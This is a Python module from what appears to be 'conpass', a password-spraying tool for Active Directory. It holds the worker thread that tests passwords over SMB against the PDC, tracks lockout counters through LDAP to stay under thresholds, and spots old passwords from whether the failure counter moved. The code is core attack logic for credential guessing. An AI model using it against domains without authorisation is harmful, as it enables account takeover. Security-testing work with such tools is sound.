"""Worker thread testing passwords on users handed out by the scheduler."""

import threading
import time
from collections.abc import Callable
from dataclasses import dataclass
from datetime import timedelta

from rich.console import Console

from conpass.core.scheduler import Scheduler
from conpass.core.status import AuthStatus
from conpass.exceptions import AuthAttemptLostError, SmbConnectionError, UserLockedOutError
from conpass.models import LockoutState, User, UserStatus
from conpass.services.database import DatabaseService
from conpass.services.kerberos import KerberosVerdict, verify_password
from conpass.services.ldap import LdapService
from conpass.services.smb import SmbService
from conpass.utils import dc_now

# Above the 5 min default of OldPasswordAllowedPeriod, to cover customized values
OLD_PASSWORD_CHECK_PERIOD = timedelta(hours=1)
# Second read before concluding that a failure was not counted
UNCOUNTED_CONFIRM_DELAY = 1.0
# Delay before retrying a user after an unexpected error
ERROR_RETRY_DELAY = 5.0

SUCCESS_DISPLAY = {
    AuthStatus.SUCCESS: (UserStatus.PASSWORD_FOUND, ""),
    AuthStatus.PASSWORD_EXPIRED: (UserStatus.PASSWORD_EXPIRED, "Password expired"),
    AuthStatus.PASSWORD_MUST_CHANGE: (UserStatus.PASSWORD_EXPIRED, "Password must be changed"),
    AuthStatus.ACCOUNT_EXPIRED: (UserStatus.ACCOUNT_EXPIRED, "Account expired"),
    AuthStatus.ACCOUNT_DISABLED: (UserStatus.ACCOUNT_DISABLED, "Account disabled"),
    AuthStatus.INVALID_WORKSTATION: (UserStatus.LOGON_RESTRICTED, "Logon restricted to some workstations"),
    AuthStatus.INVALID_LOGON_HOURS: (UserStatus.LOGON_RESTRICTED, "Outside allowed logon hours"),
    AuthStatus.MACHINE_ACCOUNT: (UserStatus.PASSWORD_FOUND, "Machine account"),
}


@dataclass
class WorkerContext:
    """Settings and shared objects common to all workers."""

    console: Console
    domain: str
    pdc_ip: str
    time_delta: timedelta
    stop_event: threading.Event
    lockout_event: threading.Event
    database_service: DatabaseService | None = None
    debug: bool = False


class Worker(threading.Thread):
    """
    Worker thread for password spraying.

    For each (user, password) handed out by the scheduler:
    1. read the user's lockout state on the PDC (single BASE search)
    2. give the user back with a delay if an attempt is not safe yet
    3. authenticate against the PDC, so that only the PDC counter moves
    4. read the state again to know if the failure was counted: a failure that
       leaves badPasswordTime untouched means the password is one of the two
       previous ones (N-1 / N-2)
    """

    def __init__(
        self,
        worker_id: int,
        scheduler: Scheduler,
        ldap_service: LdapService | None,
        smb_service: SmbService,
        context: WorkerContext,
        on_connected: Callable[[bool], None],
    ):
        super().__init__(daemon=True)
        self.worker_id = worker_id
        self.scheduler = scheduler
        self.ldap_service = ldap_service
        self.smb_service = smb_service
        self.ctx = context
        self.console = context.console
        self.on_connected = on_connected

    def _debug(self, message: str) -> None:
        if self.ctx.debug:
            self.console.print(f"[blue]Worker {self.worker_id}: {message}[/blue]")

    def run(self) -> None:
        """Main worker loop."""
        try:
            if self.ldap_service:
                self.ldap_service.connect()
            self.smb_service.connect()
        except Exception as e:
            self.console.print(f"[red]Worker {self.worker_id} failed to connect: {e}[/red]")
            self.on_connected(False)
            return
        self.on_connected(True)

        while not self.ctx.stop_event.is_set() and not self.ctx.lockout_event.is_set():
            item = self.scheduler.acquire(timeout=0.5)
            if item is None:
                continue
            user, password = item
            delay, consumed = ERROR_RETRY_DELAY, False
            try:
                delay, consumed = self._process(user, password)
            except UserLockedOutError:
                self.ctx.lockout_event.set()
                self.scheduler.close()
            except SmbConnectionError as e:
                self.console.print(f"[red]Worker {self.worker_id}: {e}[/red]")
                self.ctx.stop_event.set()
            except Exception as e:
                self.console.print(f"[red]Worker {self.worker_id} error on {user.samaccountname}: {e}[/red]")
            finally:
                self.scheduler.release(user, delay, consumed)

    # ----- one attempt -----

    def _process(self, user: User, password: str) -> tuple[float, bool]:
        """
        Test one password on one user if it is safe.

        Returns:
            (delay before the user can be handed out again, password consumed)
        """
        if not self._refresh(user):
            return 0, False

        now = dc_now(self.ctx.time_delta)
        wait = (user.next_attempt_time(now) - now).total_seconds()
        if wait > 0:
            self._debug(f"{user.samaccountname} must wait {wait:.0f}s "
                        f"(effective badPwdCount={user.effective_bad_count(now)})")
            return wait, False

        if self.ctx.lockout_event.is_set() or self.ctx.stop_event.is_set():
            return 0, False

        before = user.state
        self._debug(f"testing {user.samaccountname} / {password}")
        try:
            status = self.smb_service.test_credentials(user.samaccountname, password)
        except AuthAttemptLostError as e:
            self._debug(str(e))
            return 0, self._handle_lost_attempt(user, password, before)
        except UserLockedOutError:
            self._dump_lockout(user, password, "SMB_AUTH_RESPONSE")
            raise

        if status.is_success:
            self._handle_success(user, password, status)
        elif status == AuthStatus.ACCOUNT_RESTRICTION:
            self._handle_restricted(user, password)
        else:
            self._handle_failure(user, password, status, before)
        return 0, True

    def _refresh(self, user: User) -> bool:
        """Read the user's state on the PDC. False if the user must be dropped."""
        if not self.ldap_service:
            return True
        state = self.ldap_service.read_user_state(user.dn)
        if state is None or state.disabled:
            self.console.print(f"[bright_black]{user.samaccountname} is disabled or gone - DISCARDING[/bright_black]")
            user.status = UserStatus.ACCOUNT_DISABLED
            user.finished = True
            return False
        user.apply_state(state)
        return True

    def _was_counted(self, user: User, before: LockoutState) -> bool:
        """
        Tell whether the DC counted our failed attempt, by comparing badPasswordTime.

        A user's successful logon resets badPwdCount but not badPasswordTime, so an
        unchanged badPasswordTime can only mean that our failure was not counted.
        Without LDAP access, every failure is assumed counted.

        Raises:
            UserLockedOutError: If our attempt locked the account out
        """
        if not self.ldap_service:
            return True
        try:
            for delay in (0, UNCOUNTED_CONFIRM_DELAY):
                time.sleep(delay)
                after = self.ldap_service.read_user_state(user.dn)
                if after is None:
                    return True
                user.apply_state(after)
                if user.lockout_end(dc_now(self.ctx.time_delta)) is not None:
                    self._dump_lockout(user, "", "LDAP_STATUS_AFTER_ATTEMPT")
                    raise UserLockedOutError(user.samaccountname)
                if after.bad_pwd_filetime != before.bad_pwd_filetime:
                    return True
        except UserLockedOutError:
            raise
        except Exception as e:
            self._debug(f"post-attempt read failed for {user.samaccountname}: {e}")
            return True
        return False

    # ----- outcomes -----

    def _handle_failure(self, user: User, password: str, status: AuthStatus, before: LockoutState) -> None:
        user.record_failure(dc_now(self.ctx.time_delta))
        counted = self._was_counted(user, before)
        if not counted:
            user.cancel_last_failure()

        note = None
        if status == AuthStatus.UNKNOWN:
            self.console.print(
                f"[yellow]{user.samaccountname}: unexpected answer ({self.smb_service.last_error}), "
                f"counted as a failed attempt[/yellow]"
            )
        elif not counted:
            note = "previous"
            user.status = UserStatus.PREVIOUS_PASSWORD
            self.console.print(
                f"[magenta]{user.samaccountname} - {password}[/magenta]"
                f"[bright_black] (previous password: not counted by the DC)[/bright_black]"
            )
        else:
            user.status = UserStatus.INVALID_PASSWORD
        self._record(user, password, False, note)

    def _handle_lost_attempt(self, user: User, password: str, before: LockoutState) -> bool:
        """
        The connection dropped mid-attempt. Never replay it blindly: account for it
        first, then let the normal checks decide when to try again.

        Returns:
            True if the password is consumed (the DC counted it as a failure)
        """
        user.record_failure(dc_now(self.ctx.time_delta))
        counted = self._was_counted(user, before)
        if counted and self.ldap_service:
            self._record(user, password, False, None)
            return True
        return False

    def _handle_success(self, user: User, password: str, status: AuthStatus) -> None:
        verdict = self._check_previous_password(user, password)
        if verdict == KerberosVerdict.PREVIOUS:
            user.status = UserStatus.PREVIOUS_PASSWORD
            self.console.print(
                f"[magenta]{user.samaccountname} - {password}[/magenta]"
                f"[bright_black] (previous password, accepted by NTLM shortly after a change)[/bright_black]"
            )
            self._record(user, password, False, "previous")
            return

        user.status, detail = SUCCESS_DISPLAY[status]
        user.found_password = password
        user.finished = True
        note = None
        if verdict == KerberosVerdict.UNKNOWN:
            note = "unconfirmed"
            detail = ", ".join(filter(None, [detail, "password changed recently, may be the previous one"]))

        message = f"[yellow]{user.samaccountname} - {password}[/yellow]"
        if detail:
            message += f"[bright_black] ({detail})[/bright_black]"
        self.console.print(message)
        self._record(user, password, True, note)

    def _check_previous_password(self, user: User, password: str) -> KerberosVerdict:
        """
        NTLM network logons accept the previous password for a few minutes after a
        change (OldPasswordAllowedPeriod). Double-check recent changes with Kerberos.
        """
        pwd_last_set = user.state.pwd_last_set
        if user.has_lockout_info:
            recent = pwd_last_set is not None and \
                dc_now(self.ctx.time_delta) - pwd_last_set < OLD_PASSWORD_CHECK_PERIOD
            if not recent:
                return KerberosVerdict.CURRENT
        verdict = verify_password(user.samaccountname, password, self.ctx.domain, self.ctx.pdc_ip)
        self._debug(f"Kerberos check for {user.samaccountname}: {verdict.value}")
        return verdict

    def _handle_restricted(self, user: User, password: str) -> None:
        user.status = UserStatus.ACCOUNT_RESTRICTED
        user.finished = True
        self.console.print(
            f"[bright_black]Account {user.samaccountname} has restrictions "
            f"(likely Protected Users) - DISCARDING from further tests[/bright_black]"
        )
        self._record(user, password, False, "restricted")

    def _record(self, user: User, password: str, success: bool, note: str | None) -> None:
        if not self.ctx.database_service:
            return
        try:
            self.ctx.database_service.record_test(user.samaccountname, password, success, note)
        except Exception as e:
            self._debug(f"failed to record test in database: {e}")

    # ----- diagnostics -----

    def _dump_lockout(self, user: User, password: str, source: str) -> None:
        """Print everything known about a user that got locked out."""
        now = dc_now(self.ctx.time_delta)
        per_dc = ""
        if self.ldap_service and user.dn:
            try:
                for dc in self.ldap_service.get_user_status_per_dc(user.dn):
                    state = dc['state']
                    per_dc += (
                        f"  DC {dc['dc_ip']}: badPwdCount={state.bad_pwd_count}, "
                        f"badPasswordTime={state.bad_pwd_time}, lockoutTime={state.lockout_time}, "
                        f"UF_LOCKOUT={state.locked}\n"
                    )
            except Exception as e:
                per_dc = f"  (could not read per-DC status: {e})\n"

        self.console.print(
            f"[red bold]LOCKOUT DETECTED ({source}) - worker {self.worker_id}[/red bold]\n"
            f"{user}\n"
            f"  Password being tested: {password or '(after attempt)'}\n"
            f"  Policy: {user.policy}\n"
            f"  Security threshold: {user.security_threshold}\n"
            f"  DC time: {now.isoformat()}\n"
            f"[cyan]Status per DC (badPwdCount is not replicated):[/cyan]\n{per_dc}"
            f"[red]Unlock with: Unlock-ADAccount -Identity {user.samaccountname}[/red]"
        )
